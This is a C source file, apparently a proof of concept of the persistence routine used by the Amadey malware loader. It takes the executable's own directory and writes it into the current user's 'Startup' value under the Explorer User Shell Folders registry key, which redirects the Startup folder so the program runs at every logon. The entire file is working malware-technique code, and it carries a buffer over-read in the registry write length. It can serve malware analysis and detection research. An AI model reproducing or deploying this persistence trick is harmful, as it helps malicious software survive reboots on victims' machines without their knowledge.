/*
	* Author: Alexuiop1337
	* Project name: AmmadeyStartup
	* Description: PoC of Ammadey loader startup algorithm
*/

#define SHOW_DEBUG_INFORMATION

#include <Windows.h>

#ifdef SHOW_DEBUG_INFORMATION
#include <stdio.h>
#endif

typedef unsigned int size_t;

void _memcpy(void* dst, const void* src, size_t size);

void* _malloc(size_t size);
void _free(void* block);

int main() {
#ifdef SHOW_DEBUG_INFORMATION
	printf("Attempting to get full path to the executable...\n");
#endif
	char* path = _malloc(1024);
	if (!path) {
#ifdef SHOW_DEBUG_INFORMATION
		printf("Unable to alloc memory: %d\n", GetLastError());
#endif
		return -1;
	}
	DWORD size = GetModuleFileNameA(NULL, path, 1024);
	if (size == 0) {
#ifdef SHOW_DEBUG_INFORMATION
		printf("GetModuleFileNameA return code is 0, GetLastError(): %d\n", GetLastError());
#endif
		return -1;
	}
	
	int idx = -1;
	// Looking for backslash from the end of the string to its beginning
	for (char* i = &path[size]; i >= path; --i) {
		if (*i == '\\') {
			idx = i - path;
			break;
		}
	}
	if (idx == -1) {
#ifdef SHOW_DEBUG_INFORMATION
		printf("Unable to strip to directory\n");
#endif
		return -1;
	}

	char* realPath = _malloc(idx + 1); // +1 for \0 symbol
	if (!realPath) {
#ifdef SHOW_DEBUG_INFORMATION
		printf("Unable to alloc memory: %d\n", GetLastError());
#endif
		return -1;
	}
	_memcpy(realPath, path, idx);
	realPath[idx] = '\0';
	_free(path);
#ifdef SHOW_DEBUG_INFORMATION
	printf("Full directory path is: %s\n", realPath);
#endif
	HKEY key;
	LSTATUS status;
	status = RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", &key);
	if (status != ERROR_SUCCESS || !key) {
#ifdef SHOW_DEBUG_INFORMATION
		printf("RegOpenKeyA status: %d, GetLastError(): %d", status, GetLastError());
#endif
		return -1;
	}
	
	status = RegSetValueExA(key, "Startup", 0, REG_EXPAND_SZ, (BYTE*)realPath, size);
	if (status != ERROR_SUCCESS) {
#ifdef SHOW_DEBUG_INFORMATION
		printf("RegSetValueExA status: %d, GetLastError(): %d", status, GetLastError());
#endif
		return -1;
	}
	
	status = RegCloseKey(key);
	if (status != ERROR_SUCCESS){
#ifdef SHOW_DEBUG_INFORMATION
		printf("RegCloseKey status: %d, GetLastError(): %d", status, GetLastError());
#endif
		return -1;
	}
#ifdef SHOW_DEBUG_INFORMATION
	getchar();
#endif
}

void _memcpy(void * dst, const void * src, size_t size)
{
	BYTE* _dst = (BYTE*)dst;
	BYTE* _src = (BYTE*)src;
	while (size--) *_dst++ = *_src++;
}

void * _malloc(size_t size)
{
	return HeapAlloc(GetProcessHeap(), 0, size);
}

void _free(void * block)
{
	HeapFree(GetProcessHeap(), 0, (LPVOID)block);
}